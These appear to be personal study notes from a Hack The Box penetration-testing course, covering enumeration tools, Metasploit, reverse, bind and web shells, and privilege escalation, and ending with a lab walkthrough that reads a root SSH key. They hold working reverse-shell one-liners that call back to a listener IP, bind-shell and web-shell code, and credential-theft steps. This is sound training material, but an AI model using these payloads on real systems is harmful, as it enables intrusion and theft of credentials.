# General Notes from the HTB Pentration tester path.
---
# Common Ports
```
20/21   (TCP)	    FTP File Transfer Protocol, used to move files around
22      (TCP)	    SSH Secure Shell, used to securly connect to and manage hosts
23      (TCP)	    Telnet Same as SSH just not secure at all, used to connect to hosts and manage them just in clear text.
25      (TCP)	    SMTP Simple Mail Tranfer Protocol used to send and recieve mail for mail servers.
80      (TCP)	    HTTP Hypertext Transfer Protocol used to tranfer web content between client and a web server.
161     (TCP/UDP)	SNMP Simple Network Management Protocol used to monitor, manage and configure network devices - pull metrics - network invetory ect.
389     (TCP/UDP)	LDAP Lightweight Directory Access Protocol - used to query directory services, like active directory.
443     (TCP)	    SSL/TLS (HTTPS) Hypertext Transfer Protocol Secure - encypted secure version of HTTP. used for loading websites ect.
445     (TCP)	    SMB Server Message Block network local file sharing, people stand up and SMB drive and others connect to it and pull files.
3389    (TCP)	    RDP Remote Desktop Protocol - Like SSH but has an interactive session that you can interact with the GUI of the host.
```

---

# Different Tools
**SSH** - Can be configered for password or passwordless configuration, with public-key authentication. Uses a client server model. IE the host needs to be running OpenSSH or an SSH server.
Usage 
```bash
ssh bob@10.10.10.10
```
**Netcat** - Netcat, is a networking utility. iAnd is great for connecting shells in a pen test. You can use it to either catch a connection or send one. Can also be used for banner grabbing which basically you point it at a port on the target host and it will return the service running on that port. 
```bash
nc 10.10.10.10 22
```
**returns OpenSSH running on 22**

**Tmux** - Used for multiboxing terminals, ctr + b opens a new terminal, and we can swtich between them with 0, 1 ect. Shift + " will split them horizontally, and Shift + % will split them vertically. Also can switch between the windows with up down left or right keypad arrows.

**VIM** - a text editor.. to edit file hit i (insert mode) 
```
Command	Description
x	    Cut character
dw	    Cut word
dd	    Cut full line
yw	    Copy word
yy	    Copy full line
p	    Paste
:1	    Go to line number 1.
:w	    Write the file, save
:q	    Quit
:q!	    Quit without saving
:wq	    Write and quit
```

**Ports** - range from 1 to 65,535 well known ports are 1 through 1023, port 0 is treated as a wild card port.

**NMAP** - Used to scan hosts in a subnet and enumerate services operating on ports. Just doing --
```bash
namp <target_ip>
```
This will run a quick scan against the 1000 most common ports returning the state, service, port, ect. We can use the -sC parameter to define nmap common/default scripts usage. the -sV flag will identify the service and version from the scan. -p- will tell nmap to scan all 1-65,000 ports (all ports) this will take alot longer than just a standard scan. NMAP scripts in general can extend the utility of NMAP notably. To find them we can run:
```bash
locate scripts/<script_you_want>
```
```bash
nmap --script <script_name> -p<ports> <host>
```

**FTP** - File transfer protocol can be used to pull files from a host if left open with anonymous login allowed.
Usage:
```bash
ftp -p 10.129.42.253
get login.txt
```
**SMB** - Server Message Block can actually be used for RCE via eternal blue, but for the most part another good vector to find sensitive files and passwords, like seen in ftp. smb-os-disovery.nse can be used to extract the OS running on a host, can be usefull. To login to an smv share the following works for listing all the shares on a client
```bash
smbclient -N -L \\\\10.129.53.353
```
This will also list the users and the shares they are a part of. To target a specific users share run:
```bash 
smbclient \\\\10.129.42.253\\users
```
If you need to do it in the contex of a user the following works but also will prompt for a password.
```bash
smbclient -U bob \\\\10.129.43.253\users
```

---

# Web Eumeration

**Gobuster** - Versatile tool that can perform DNS, vhost, and directory brute-forcing. Can also enumerate public AWS S3 buckets. 
Usage - directory bruteforce mode.
```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
Link to http status codes: https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

Installation of Seclist
```bash 
git clone https://github.com/danielmiessler/SecLists
sudo apt install seclists -y 
```

Usage - dns subnet enumeration
```bash
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

**Banner Grabbing** - Banner grabbing on web servers is another enumeration tactic that can reveal specific application frameworks in use. This can be gleaned by using curl.
Usage -
```bash
curl -IL https://www.inlanefreight.com
```

**Whatweb** - Can be used to extract the version of web servers, supporting frameworks, and applications using the command-line tool.
Usage - 
```bash
whatweb 10.1.10.121
```

**Certificates** - Certificates are another valuable source of information when https is in use. Looking at the certificates could show the email domain, the company and other phishing based targets.

**Robots.txt** - This instructs the search engine web crawlers, like googlebot which rescource can and cannot be accessed for indexing. 

**Source Code** - The source code of a site might have mistakes by a developer leaving comments in the code for a test account ect.

---

# Public Exploits
Once services have been identified via NMAP scan, we want to ensure wether or not they have public exploits available. First off just google the service version and exploit is the lowest hanging fruit. Other exploit sites are **Exploit DB**, **Rapid7 DB**, or **vulnerability lab**.

**searchsploit** - can be used to find exploits via bash shell. 

Installation
```bash
sudo apt install exploitdb -y
```
usage - search for an exploit and version
```bash
searchsploit openssh 7.2
```
**Metasploit** - can also be used to search exploits and quickly plug them in and use them.
usage - in metasploit console
```bash
msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec
show options
set RHOST <target>
set LHOST <tun0>
check (check if vuln)
exploit (execute exploit)
getuid (check privs)
shell (get interactive shell)
```

---

# Types of Shells
**Reverse Shell** - Sends a shell from a target host back to a listener port on the local host. Easy reliable.
Types(call back):
**Bash**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
**Bash**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
**Powershell**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
**Netcat listener**
```bash
nc -lvpn 4444
```
```
-l - listen for a connection
-v - verbose mode
-n - disable dns resolution only connect from IPs
-p - define the port you want active connection on
```

**Bind Shell** - Listens on an open port to catch an incoming connection. Like your binding bash to listen on x port, and when it recieves a connection that port will open a shell session for the target host. Pros is once its setup the port is open its reliable and if you lose connection you can connect right back.
Types(Listen for incoming):
**Bash**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
**Python**
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
**Powershell**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
**Connect to Bindshell via NC**
```bash
nc 10.10.10.1 1234
```
**Upgrade TTY**
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
Then run ctrl+z
Then run in terminal:
```bash 
stty raw -echo
fg
```
After that you should have an upgraded shell where you can use all the normal shell operations.

**Web Shell** - Web shell typically is getting a shell onto a web sever, and interacting with that shell via web requests to the server. The commands will be part of the searched url string, and the outputs will be logged in messages from the web server.
**Types of webshell implants:**
**php**
```php
<?php system($_REQUEST["cmd"]); ?>
```
**jsp**
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
**asp**
```asp
<% eval request("cmd") %>
```
These typically need to be uploaded to a websevers webroot directory and execute them through the web browser. These are the common webroot default directories.

Web Server - Apache
```
/var/www/html/
```
Web Server - Nginx
```
/usr/local/nginx/html/
```
Web Server - IIS
```
c:\inetpub\wwwroot\

```
Web Server - XAMPP
```
C:\xampp\htdocs\
```
The command to write a webshell to one of these diretories is very straight forward, however it may need to be url encoded.
Examples:
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

**Find local ip** - to list your local ip and interfaces just run ip -a, ifconfig, or ipconfig.
```bash
ip a
```

---

# Privilege Escalation
**Helpfull Links**
When landing on a host, typically we have a lower privileged shell, to esclate privs on windows we want to get the System account on linux the target is Root. Some really great places to start are:
```
HackTricks: https://book.hacktricks.xyz/
PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
GTFO Bins: https://gtfobins.github.io/
LOLBAS: https://lolbas-project.github.io/#
```
**Host Enumeration**
There are also enumeration scripts that can aid in identifying vulnerabilities on a host. They will run through a list of predfined commands and places to look, and return results. Common Enumeration Scripts Include:
```
Linux:
https://github.com/rebootuser/LinEnum.git
https://github.com/sleventyeleven/linuxprivchecker

Windows:
https://github.com/411Hall/JAWS
https://github.com/GhostPack/Seatbelt

Windows/Linux:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
```
**Kernel Exploits**
Hosts running on outdated operating systems typically will be vulnerable to kernel exploitation, which can be taken advatage of through tools like searchsploit.

**Vulnerable Software**
Vulnerable software versions can also be leveraged, public exploits can be found on running software.

**Windows** - Check Program Files
**Linux** - dpkg -l

**User Privileges** - These can be exploited by SUID, Windows Token Privileges, and sudo.

Good command to check when landing on a box is -
```bash 
sudo -l
```
This is able to check what the current privs allowed for sudo with the user.

**Scheduled Tasks**
In linux these are called Cron Jobs, windows they are scheduled tasks. The two ways they are typically abused is by adding a new scheduled task or by tricking the current scheduled tasks to execute a malicous binary. If you have write privs on the follwing directories you can add a Cron Job:
```
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
```
We can also get credentials via exposed command history logs, these command history logs can be found in **bash_history** in Linux or **PSReadLine** in Windows. Enumeration scripts will often parse these locations in an attempt to extract.

**SSH Keys**
Having read access to the SSH directory allows us to extract a users private keys. They can be found at:
```
/home/user/.ssh/id_rsa 
/root/.ssh/id_rsa
```
Having access to the root ssh key directory, you can take the key copy it to the local machine and use the -i flag to login with it. Commands:
```bash
vim id_rsa
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa
```
**Labs Steps**
Login to user1 via ssh
```bash
ssh user1@83.136.253.144 -p 38815
```
Check sudo perms
```bash
su -l
```
This reveals that user1 can launch a shell for user2 via
```bash 
sudo -u user2 /bin/bash
```
Next I tried to enumerate suid binaries with 
```bash
 find / -perm -4000 -type f 2>/dev/null
```
No results so checked if root ssh dir was readable, it was :)
```bash 
find / -type f -name "id_rsa" 2>/dev/null
```
After that read the key:
```bash
cat /root/.ssh/id_rsa
```
Copied the key over to local kali host, into root_key than used it to login to the root user via ssh.
```bash 
nano root_key
chmod 600 root_key
ssh -i root_key root@<IP>
```
boom flag.